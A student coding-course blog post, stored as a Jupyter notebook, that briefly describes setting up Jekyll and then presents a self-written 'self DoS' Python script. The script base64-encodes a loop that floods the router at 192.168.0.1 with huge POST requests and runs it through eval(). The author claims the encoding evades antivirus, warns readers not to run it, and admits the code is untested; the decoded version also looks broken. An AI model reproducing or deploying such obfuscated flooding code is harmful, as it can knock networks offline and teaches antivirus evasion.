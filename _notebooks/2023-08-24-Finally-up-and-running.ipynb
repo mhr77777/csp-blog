{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "comments: true\n",
    "layout: post\n",
    "title: Finally up and running\n",
    "description: Finally got my computer running and pages working!\n",
    "type: hacks\n",
    "courses: { csse: {week: 0}, csp: {week: 2}, csa: {week: 0} }\n",
    "categories: [C4.2]\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Finally up and running!\n",
    "\n",
    "I've had to cram weeks zero and one into a class period due to technical issues making my laptop unusable for the first two weeks. It's fine though, as I've used jekyll before, and I certainly know how to set it up at this point.\n",
    "\n",
    "The process was pretty simple: Fork -> Git Clone -> set up ruby packages with `bundle install` -> run make -> start editing\n",
    "\n",
    "Week two (the week I'm revising this) is supposed to have some experimentation with python, so here's this: \n",
    "\n",
    "# NOTE: DO NOT RUN THIS. IT IS A SELF DoS. IT SENDS 2GB PACKETS TO YOUR ROUTER WITHOUT DELAYS IN BETWEEN.\n",
    "\n",
    "\n",
    "# THIS IS A SERIOUS WARNING. I WILL NOT BE HELD LIABLE IF YOU RUN THIS. I DO NOT WANT YOU TO RUN THIS. I ONLY MADE IT BECAUSE CODING THIS KIND OF STUFF IS FUN. I DO NOT INTEND TO CAUSE REAL WORLD DAMAGE."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import base64\n",
    "\n",
    "#encoded self dos script, should bypass AV until it's too late.\n",
    "payload = \"\"\"d2hpbGUgVHJ1ZSBpcyBUcnVlOgoJcmVxdWVzdHMucG9zdCgiMTkyLjE2OC4wLjEiLCAiMCIqMjE0NzQ4MzY0Nyk=\"\"\"\n",
    "\n",
    "\"\"\"\n",
    "\n",
    "This is the unencoded payload:\n",
    "\n",
    "#While loop\n",
    "while True is True:\n",
    "    \n",
    "    #Send a request to 192.168.0.1 (most common router IP) and make the data a string containing 2147483647 zeroes.\n",
    "\trequests.post(\"192.168.0.1\", \"0\"*2147483647)\n",
    "\n",
    "\"\"\"\n",
    "\n",
    "#decodes and executes the payload\n",
    "eval(base64.b64decode(payload))\n",
    "\n",
    "#I wrote this myself, by the way. This is original for this blog post. I have never tested the payload, but virustotal doesn't like the compiled EXE."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you ran it, it's your fault."
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
